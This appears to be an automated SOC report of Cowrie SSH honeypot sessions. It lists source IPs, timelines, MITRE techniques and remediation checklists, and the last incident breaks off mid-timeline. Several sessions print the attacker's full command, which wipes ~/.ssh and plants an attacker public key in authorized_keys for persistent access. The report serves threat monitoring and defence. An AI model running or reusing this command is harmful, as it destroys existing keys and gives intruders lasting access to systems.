| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:26 |
| **Last Seen** | 2026-06-13 06:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:26:38` | `cowrie.session.connect` |
| `2026-06-13 06:26:38` | `cowrie.client.version` |
| `2026-06-13 06:26:38` | `cowrie.client.kex` |
| `2026-06-13 06:26:39` | `cowrie.login.success` |
| `2026-06-13 06:26:39` | `cowrie.session.params` |
| `2026-06-13 06:26:39` | `cowrie.command.input` |
| `2026-06-13 06:26:39` | `cowrie.command.failed` |
| `2026-06-13 06:26:40` | `cowrie.log.closed` |
| `2026-06-13 06:26:40` | `cowrie.session.params` |
| `2026-06-13 06:26:40` | `cowrie.command.input` |
| `2026-06-13 06:26:40` | `cowrie.session.file_download` |
| `2026-06-13 06:26:40` | `cowrie.log.closed` |
| `2026-06-13 06:26:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ecbeb8a8632

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:26 |
| **Last Seen** | 2026-06-13 06:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:26:42` | `cowrie.session.connect` |
| `2026-06-13 06:26:42` | `cowrie.client.version` |
| `2026-06-13 06:26:43` | `cowrie.client.kex` |
| `2026-06-13 06:26:43` | `cowrie.login.success` |
| `2026-06-13 06:26:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2c5905e219d

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:29 |
| **Last Seen** | 2026-06-13 06:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:29:00` | `cowrie.session.connect` |
| `2026-06-13 06:29:00` | `cowrie.client.version` |
| `2026-06-13 06:29:00` | `cowrie.client.kex` |
| `2026-06-13 06:29:01` | `cowrie.login.success` |
| `2026-06-13 06:29:01` | `cowrie.session.params` |
| `2026-06-13 06:29:01` | `cowrie.command.input` |
| `2026-06-13 06:29:01` | `cowrie.command.failed` |
| `2026-06-13 06:29:01` | `cowrie.log.closed` |
| `2026-06-13 06:29:01` | `cowrie.session.params` |
| `2026-06-13 06:29:01` | `cowrie.command.input` |
| `2026-06-13 06:29:01` | `cowrie.session.file_download` |
| `2026-06-13 06:29:01` | `cowrie.log.closed` |
| `2026-06-13 06:29:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-853f7ce0448d

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:29 |
| **Last Seen** | 2026-06-13 06:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:29:04` | `cowrie.session.connect` |
| `2026-06-13 06:29:04` | `cowrie.client.version` |
| `2026-06-13 06:29:04` | `cowrie.client.kex` |
| `2026-06-13 06:29:04` | `cowrie.login.success` |
| `2026-06-13 06:29:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e85f6b1e1157

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:41 |
| **Last Seen** | 2026-06-13 06:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:41:03` | `cowrie.session.connect` |
| `2026-06-13 06:41:03` | `cowrie.client.version` |
| `2026-06-13 06:41:03` | `cowrie.client.kex` |
| `2026-06-13 06:41:04` | `cowrie.login.success` |
| `2026-06-13 06:41:04` | `cowrie.session.params` |
| `2026-06-13 06:41:04` | `cowrie.command.input` |
| `2026-06-13 06:41:04` | `cowrie.command.failed` |
| `2026-06-13 06:41:05` | `cowrie.log.closed` |
| `2026-06-13 06:41:05` | `cowrie.session.params` |
| `2026-06-13 06:41:05` | `cowrie.command.input` |
| `2026-06-13 06:41:05` | `cowrie.session.file_download` |
| `2026-06-13 06:41:05` | `cowrie.log.closed` |
| `2026-06-13 06:41:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46f21f90dcdd

| Field | Detail |
|---|---|
| **Source IP** | `160.251.233[.]37` |
| **First Seen** | 2026-06-13 06:41 |
| **Last Seen** | 2026-06-13 06:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:41:07` | `cowrie.session.connect` |
| `2026-06-13 06:41:07` | `cowrie.client.version` |
| `2026-06-13 06:41:07` | `cowrie.client.kex` |
| `2026-06-13 06:41:08` | `cowrie.login.success` |
| `2026-06-13 06:41:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.233[.]37` to AbuseIPDB if not already reported
- [ ] Block `160.251.233[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3853a3cec40f

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:43 |
| **Last Seen** | 2026-06-13 06:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:43:36` | `cowrie.session.connect` |
| `2026-06-13 06:43:36` | `cowrie.client.version` |
| `2026-06-13 06:43:37` | `cowrie.client.kex` |
| `2026-06-13 06:43:37` | `cowrie.login.success` |
| `2026-06-13 06:43:37` | `cowrie.session.params` |
| `2026-06-13 06:43:37` | `cowrie.command.input` |
| `2026-06-13 06:43:37` | `cowrie.command.failed` |
| `2026-06-13 06:43:38` | `cowrie.log.closed` |
| `2026-06-13 06:43:38` | `cowrie.session.params` |
| `2026-06-13 06:43:38` | `cowrie.command.input` |
| `2026-06-13 06:43:38` | `cowrie.session.file_download` |
| `2026-06-13 06:43:38` | `cowrie.log.closed` |
| `2026-06-13 06:43:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81aa09da72f2

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:43 |
| **Last Seen** | 2026-06-13 06:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:43:40` | `cowrie.session.connect` |
| `2026-06-13 06:43:40` | `cowrie.client.version` |
| `2026-06-13 06:43:40` | `cowrie.client.kex` |
| `2026-06-13 06:43:41` | `cowrie.login.success` |
| `2026-06-13 06:43:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63ec531708f5

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:46 |
| **Last Seen** | 2026-06-13 06:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:46:34` | `cowrie.session.connect` |
| `2026-06-13 06:46:34` | `cowrie.client.version` |
| `2026-06-13 06:46:34` | `cowrie.client.kex` |
| `2026-06-13 06:46:34` | `cowrie.login.success` |
| `2026-06-13 06:46:35` | `cowrie.session.params` |
| `2026-06-13 06:46:35` | `cowrie.command.input` |
| `2026-06-13 06:46:35` | `cowrie.command.failed` |
| `2026-06-13 06:46:35` | `cowrie.log.closed` |
| `2026-06-13 06:46:35` | `cowrie.session.params` |
| `2026-06-13 06:46:35` | `cowrie.command.input` |
| `2026-06-13 06:46:35` | `cowrie.session.file_download` |
| `2026-06-13 06:46:35` | `cowrie.log.closed` |
| `2026-06-13 06:46:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-349a0e61066f

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:46 |
| **Last Seen** | 2026-06-13 06:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:46:37` | `cowrie.session.connect` |
| `2026-06-13 06:46:37` | `cowrie.client.version` |
| `2026-06-13 06:46:38` | `cowrie.client.kex` |
| `2026-06-13 06:46:38` | `cowrie.login.success` |
| `2026-06-13 06:46:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b721c0e32ec4

| Field | Detail |
|---|---|
| **Source IP** | `197.248.159[.]62` |
| **First Seen** | 2026-06-13 06:51 |
| **Last Seen** | 2026-06-13 06:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:51:27` | `cowrie.session.connect` |
| `2026-06-13 06:51:27` | `cowrie.client.version` |
| `2026-06-13 06:51:27` | `cowrie.client.kex` |
| `2026-06-13 06:51:28` | `cowrie.login.success` |
| `2026-06-13 06:51:28` | `cowrie.session.params` |
| `2026-06-13 06:51:28` | `cowrie.command.input` |
| `2026-06-13 06:51:28` | `cowrie.command.failed` |
| `2026-06-13 06:51:29` | `cowrie.log.closed` |
| `2026-06-13 06:51:29` | `cowrie.session.params` |
| `2026-06-13 06:51:29` | `cowrie.command.input` |
| `2026-06-13 06:51:29` | `cowrie.session.file_download` |
| `2026-06-13 06:51:29` | `cowrie.log.closed` |
| `2026-06-13 06:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.159[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.248.159[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-808ddb82d241

| Field | Detail |
|---|---|
| **Source IP** | `197.248.159[.]62` |
| **First Seen** | 2026-06-13 06:51 |
| **Last Seen** | 2026-06-13 06:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:51:32` | `cowrie.session.connect` |
| `2026-06-13 06:51:32` | `cowrie.client.version` |
| `2026-06-13 06:51:32` | `cowrie.client.kex` |
| `2026-06-13 06:51:33` | `cowrie.login.success` |
| `2026-06-13 06:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.159[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.248.159[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1ad3d2ca0c6

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:51 |
| **Last Seen** | 2026-06-13 06:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:51:40` | `cowrie.session.connect` |
| `2026-06-13 06:51:40` | `cowrie.client.version` |
| `2026-06-13 06:51:40` | `cowrie.client.kex` |
| `2026-06-13 06:51:41` | `cowrie.login.success` |
| `2026-06-13 06:51:41` | `cowrie.session.params` |
| `2026-06-13 06:51:41` | `cowrie.command.input` |
| `2026-06-13 06:51:41` | `cowrie.command.failed` |
| `2026-06-13 06:51:41` | `cowrie.log.closed` |
| `2026-06-13 06:51:41` | `cowrie.session.params` |
| `2026-06-13 06:51:41` | `cowrie.command.input` |
| `2026-06-13 06:51:42` | `cowrie.session.file_download` |
| `2026-06-13 06:51:42` | `cowrie.log.closed` |
| `2026-06-13 06:51:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2f7be3469fc

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 06:51 |
| **Last Seen** | 2026-06-13 06:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:51:44` | `cowrie.session.connect` |
| `2026-06-13 06:51:44` | `cowrie.client.version` |
| `2026-06-13 06:51:44` | `cowrie.client.kex` |
| `2026-06-13 06:51:44` | `cowrie.login.success` |
| `2026-06-13 06:51:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.64.19[.]167` to AbuseIPDB if not already reported
- [ ] Block `212.64.19[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f995e8f7b67

| Field | Detail |
|---|---|
| **Source IP** | `114.220.176[.]69` |
| **First Seen** | 2026-06-13 06:52 |
| **Last Seen** | 2026-06-13 06:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:52:43` | `cowrie.session.connect` |
| `2026-06-13 06:52:43` | `cowrie.client.version` |
| `2026-06-13 06:52:43` | `cowrie.client.kex` |
| `2026-06-13 06:52:43` | `cowrie.login.success` |
| `2026-06-13 06:52:44` | `cowrie.session.params` |
| `2026-06-13 06:52:44` | `cowrie.command.input` |
| `2026-06-13 06:52:44` | `cowrie.command.failed` |
| `2026-06-13 06:52:44` | `cowrie.log.closed` |
| `2026-06-13 06:52:44` | `cowrie.session.params` |
| `2026-06-13 06:52:44` | `cowrie.command.input` |
| `2026-06-13 06:52:44` | `cowrie.session.file_download` |
| `2026-06-13 06:52:44` | `cowrie.log.closed` |
| `2026-06-13 06:52:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.220.176[.]69` to AbuseIPDB if not already reported
- [ ] Block `114.220.176[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32e1c39a5bb2

| Field | Detail |
|---|---|
| **Source IP** | `114.220.176[.]69` |
| **First Seen** | 2026-06-13 06:52 |
| **Last Seen** | 2026-06-13 06:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 06:52:46` | `cowrie.session.connect` |
| `2026-06-13 06:52:46` | `cowrie.client.version` |
| `2026-06-13 06:52:46` | `cowrie.client.kex` |
| `2026-06-13 06:52:50` | `cowrie.login.success` |
| `2026-06-13 06:52:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.220.176[.]69` to AbuseIPDB if not already reported
- [ ] Block `114.220.176[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6a6013f1e1e

| Field | Detail |
|---|---|
| **Source IP** | `212.64.19[.]167` |
| **First Seen** | 2026-06-13 07:01 |
| **Last Seen** | 2026-06-13 07:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:01:57` | `cowrie.session.connect` |
